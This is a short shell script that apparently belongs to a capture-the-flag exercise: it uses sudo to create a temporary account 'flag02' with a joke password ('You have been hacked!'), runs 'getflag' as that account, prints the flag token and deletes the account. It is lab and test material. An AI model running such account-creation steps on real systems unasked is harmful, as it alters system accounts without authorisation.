#!/bin/sh -eu

sudo useradd \
  --no-create-home \
  --no-user-group \
  --password '💀 You have been hacked! 💀' \
  --uid 3002 \
  flag02
echo -n 'flag02: '
sudo -u flag02 getflag | grep -oE '[^ ]+$'
sudo userdel flag02
